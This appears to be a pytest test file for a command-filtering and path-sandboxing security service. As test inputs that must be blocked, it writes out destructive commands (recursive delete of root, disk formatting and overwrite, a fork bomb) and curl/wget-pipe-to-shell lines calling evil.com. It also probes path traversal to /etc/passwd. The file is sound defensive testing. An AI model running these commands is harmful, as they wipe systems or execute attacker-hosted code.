"""Tests for polaris.domain.services.security_service.

Covers:
- SecurityCheckResult dataclass
- SecurityService path sandboxing and command filtering
- Global helper functions (is_dangerous_command, get_security_service, reset_security_service)
"""

from __future__ import annotations

from pathlib import Path

import pytest
from polaris.domain.exceptions import PermissionDeniedError
from polaris.domain.services.security_service import (
    DANGEROUS_PATTERNS,
    SecurityCheckResult,
    SecurityService,
    get_security_service,
    is_dangerous_command,
    reset_security_service,
)

# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    """Return a temporary workspace directory."""
    return tmp_path / "workspace"


@pytest.fixture
def service(workspace: Path) -> SecurityService:
    """Return a SecurityService instance with a temp workspace."""
    workspace.mkdir(parents=True, exist_ok=True)
    return SecurityService(workspace)


@pytest.fixture(autouse=True)
def reset_global_service() -> None:
    """Reset the global security service singleton before each test."""
    reset_security_service()


# =============================================================================
# SecurityCheckResult
# =============================================================================


class TestSecurityCheckResult:
    def test_defaults(self) -> None:
        result = SecurityCheckResult(is_safe=True)
        assert result.is_safe is True
        assert result.reason == ""
        assert result.pattern_matched == ""
        assert result.suggested_alternative is None

    def test_full_construction(self) -> None:
        result = SecurityCheckResult(
            is_safe=False,
            reason="blocked",
            pattern_matched="rm -rf",
            suggested_alternative="use trash",
        )
        assert result.is_safe is False
        assert result.reason == "blocked"
        assert result.pattern_matched == "rm -rf"
        assert result.suggested_alternative == "use trash"


# =============================================================================
# SecurityService.__init__
# =============================================================================


class TestSecurityServiceInit:
    def test_init_with_string(self, workspace: Path) -> None:
        service = SecurityService(str(workspace))
        assert service.workspace_root == workspace.resolve()

    def test_init_with_path(self, workspace: Path) -> None:
        service = SecurityService(workspace)
        assert service.workspace_root == workspace.resolve()

    def test_init_relative_path(self, tmp_path: Path) -> None:
        rel = tmp_path / "rel"
        rel.mkdir()
        service = SecurityService(rel)
        assert service.workspace_root == rel.resolve()

    def test_dangerous_patterns_loaded(self, service: SecurityService) -> None:
        assert len(service._dangerous_patterns) == len(DANGEROUS_PATTERNS)
        # All patterns should be compiled regex objects
        for pattern, _reason in service._dangerous_patterns:
            assert hasattr(pattern, "search")


# =============================================================================
# is_path_safe
# =============================================================================


class TestIsPathSafe:
    def test_path_inside_workspace(self, service: SecurityService, workspace: Path) -> None:
        result = service.is_path_safe("file.txt")
        assert result.is_safe is True
        assert result.reason == ""

    def test_path_inside_workspace_subdir(self, service: SecurityService, workspace: Path) -> None:
        subdir = workspace / "subdir"
        subdir.mkdir()
        result = service.is_path_safe("subdir/file.txt")
        assert result.is_safe is True

    def test_absolute_path_inside_workspace(self, service: SecurityService, workspace: Path) -> None:
        result = service.is_path_safe(str(workspace / "file.txt"))
        assert result.is_safe is True

    def test_path_outside_workspace(self, service: SecurityService) -> None:
        result = service.is_path_safe("/etc/passwd")
        assert result.is_safe is False
        assert "outside workspace" in result.reason

    def test_relative_path_traversal_blocked(self, service: SecurityService) -> None:
        result = service.is_path_safe("../outside.txt")
        assert result.is_safe is False
        assert "outside workspace" in result.reason

    def test_symlink_inside_workspace(self, service: SecurityService, workspace: Path) -> None:
        real_file = workspace / "real.txt"
        real_file.write_text("hello")
        link = workspace / "link.txt"
        link.symlink_to(real_file)
        result = service.is_path_safe("link.txt")
        assert result.is_safe is True

    def test_symlink_outside_workspace(self, service: SecurityService, workspace: Path, tmp_path: Path) -> None:
        outside = tmp_path / "outside.txt"
        outside.write_text("secret")
        link = workspace / "evil_link.txt"
        link.symlink_to(outside)
        result = service.is_path_safe("evil_link.txt")
        assert result.is_safe is False
        assert "outside workspace" in result.reason

    def test_empty_path(self, service: SecurityService) -> None:
        result = service.is_path_safe("")
        # Empty string resolves to workspace_root, which is inside workspace
        assert result.is_safe is True

    def test_tilde_expansion(self, service: SecurityService) -> None:
        # ~ should expand to user home, which is outside temp workspace
        result = service.is_path_safe("~/file.txt")
        assert result.is_safe is False

    def test_path_as_path_object(self, service: SecurityService, workspace: Path) -> None:
        result = service.is_path_safe(Path("file.txt"))
        assert result.is_safe is True

    def test_deeply_nested_relative_path(self, service: SecurityService, workspace: Path) -> None:
        deep = workspace / "a" / "b" / "c"
        deep.mkdir(parents=True)
        result = service.is_path_safe("a/b/c/file.txt")
        assert result.is_safe is True

    def test_path_with_dot_segments(self, service: SecurityService, workspace: Path) -> None:
        (workspace / "subdir").mkdir()
        result = service.is_path_safe("subdir/./file.txt")
        assert result.is_safe is True


# =============================================================================
# is_command_safe
# =============================================================================


class TestIsCommandSafe:
    def test_safe_command(self, service: SecurityService) -> None:
        result = service.is_command_safe("echo hello")
        assert result.is_safe is True

    def test_safe_python_command(self, service: SecurityService) -> None:
        result = service.is_command_safe("python -m pytest tests/")
        assert result.is_safe is True

    def test_rm_rf_root_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("rm -rf /")
        assert result.is_safe is False
        assert "Recursive delete" in result.reason

    def test_rm_rf_system_path_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("rm -rf /etc")
        assert result.is_safe is False

    def test_mkfs_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("mkfs.ext4 /dev/sda1")
        assert result.is_safe is False
        assert "Format" in result.reason

    def test_dd_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("dd if=/dev/zero of=/dev/sda")
        assert result.is_safe is False
        assert "Direct disk write" in result.reason

    def test_overwrite_disk_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("> /dev/sda")
        assert result.is_safe is False
        assert "Overwrite disk" in result.reason

    def test_fork_bomb_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe(":(){ :|:& };:")
        assert result.is_safe is False
        assert "Fork bomb" in result.reason

    def test_cpu_exhaustion_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("while true; do :; done")
        assert result.is_safe is False
        assert "CPU exhaustion" in result.reason

    def test_chmod_777_root_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("chmod -R 777 /")
        assert result.is_safe is False
        assert "Recursive permission" in result.reason

    def test_mv_to_null_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("mv important.txt /dev/null")
        assert result.is_safe is False
        assert "null device" in result.reason

    def test_curl_pipe_sh_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("curl http://evil.com | sh")
        assert result.is_safe is False
        assert "curl" in result.reason.lower()

    def test_wget_pipe_bash_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("wget http://evil.com | bash")
        assert result.is_safe is False

    def test_eval_variable_blocked(self, service: SecurityService) -> None:
        result = service.is_command_safe("eval $FOO")
        assert result.is_safe is False
        assert "Eval" in result.reason

    def test_case_insensitive_match(self, service: SecurityService) -> None:
        result = service.is_command_safe("RM -RF /etc")
        assert result.is_safe is False

    def test_command_with_extra_whitespace(self, service: SecurityService) -> None:
        result = service.is_command_safe("rm  -rf  /etc")
        assert result.is_safe is False

    def test_empty_command(self, service: SecurityService) -> None:
        result = service.is_command_safe("")
        assert result.is_safe is True

    def test_dangerous_substring_in_safe_command(self, service: SecurityService) -> None:
        # "rm" alone is not dangerous per the patterns
        result = service.is_command_safe("rm file.txt")
        assert result.is_safe is True

    def test_pattern_matched_populated(self, service: SecurityService) -> None:
        result = service.is_command_safe("rm -rf /")
        assert result.pattern_matched != ""


# =============================================================================
# validate_file_operation
# =============================================================================


class TestValidateFileOperation:
    def test_read_safe(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("read", "file.txt")
        assert result.is_safe is True

    def test_write_safe(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("write", "file.txt")
        assert result.is_safe is True

    def test_edit_safe(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("edit", "file.txt")
        assert result.is_safe is True

    def test_delete_safe(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("delete", "file.txt")
        assert result.is_safe is True

    def test_write_outside_workspace_blocked(self, service: SecurityService) -> None:
        result = service.validate_file_operation("write", "/etc/passwd")
        assert result.is_safe is False
        assert "outside workspace" in result.reason

    def test_delete_workspace_root_blocked(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("delete", str(workspace))
        assert result.is_safe is False
        assert "workspace root" in result.reason

    def test_edit_workspace_root_blocked(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("edit", str(workspace))
        assert result.is_safe is False

    def test_write_workspace_root_blocked(self, service: SecurityService, workspace: Path) -> None:
        result = service.validate_file_operation("write", str(workspace))
        assert result.is_safe is False

    def test_read_workspace_root_allowed(self, service: SecurityService, workspace: Path) -> None:
        # Read is not in the dangerous operations list
        result = service.validate_file_operation("read", str(workspace))
        assert result.is_safe is True

    def test_unknown_operation_path_safe(self, service: SecurityService) -> None:
        result = service.validate_file_operation("unknown", "file.txt")
        assert result.is_safe is True


# =============================================================================
# sanitize_path
# =============================================================================


class TestSanitizePath:
    def test_sanitize_relative_path(self, service: SecurityService, workspace: Path) -> None:
        result = service.sanitize_path("file.txt")
        assert result == (workspace / "file.txt").resolve()

    def test_sanitize_absolute_inside_workspace(self, service: SecurityService, workspace: Path) -> None:
        result = service.sanitize_path(str(workspace / "file.txt"))
        assert result == (workspace / "file.txt").resolve()

    def test_sanitize_outside_raises(self, service: SecurityService) -> None:
        with pytest.raises(PermissionDeniedError) as exc_info:
            service.sanitize_path("/etc/passwd")
        assert "security check failed" in str(exc_info.value).lower()
        assert exc_info.value.details.get("action") == "access"
        assert exc_info.value.details.get("resource") == "/etc/passwd"

    def test_sanitize_traversal_raises(self, service: SecurityService) -> None:
        with pytest.raises(PermissionDeniedError):
            service.sanitize_path("../outside.txt")

    def test_sanitize_returns_resolved_path(self, service: SecurityService, workspace: Path) -> None:
        (workspace / "subdir").mkdir()
        result = service.sanitize_path("subdir/../file.txt")
        assert result == (workspace / "file.txt").resolve()


# =============================================================================
# Global functions
# =============================================================================


class TestIsDangerousCommand:
    def test_dangerous_command(self) -> None:
        is_dangerous, reason = is_dangerous_command("rm -rf /")
        assert is_dangerous is True
        assert reason != ""

    def test_safe_command(self) -> None:
        is_dangerous, reason = is_dangerous_command("echo hello")
        assert is_dangerous is False
        assert reason == ""

    def test_empty_command(self) -> None:
        is_dangerous, _reason = is_dangerous_command("")
        assert is_dangerous is False


class TestGetSecurityService:
    def test_creates_singleton(self) -> None:
        s1 = get_security_service()
        s2 = get_security_service()
        assert s1 is s2

    def test_same_workspace_reuses(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        ws.mkdir()
        s1 = get_security_service(ws)
        s2 = get_security_service(ws)
        assert s1 is s2

    def test_different_workspace_creates_new(self, tmp_path: Path) -> None:
        ws1 = tmp_path / "ws1"
        ws1.mkdir()
        ws2 = tmp_path / "ws2"
        ws2.mkdir()
        s1 = get_security_service(ws1)
        s2 = get_security_service(ws2)
        assert s1 is not s2
        assert s1.workspace_root == ws1.resolve()
        assert s2.workspace_root == ws2.resolve()

    def test_defaults_to_cwd(self) -> None:
        s = get_security_service()
        assert s.workspace_root == Path.cwd().resolve()

    def test_none_uses_cwd(self) -> None:
        s = get_security_service(None)
        assert s.workspace_root == Path.cwd().resolve()


class TestResetSecurityService:
    def test_resets_singleton(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        ws.mkdir()
        s1 = get_security_service(ws)
        reset_security_service()
        s2 = get_security_service()
        assert s1 is not s2
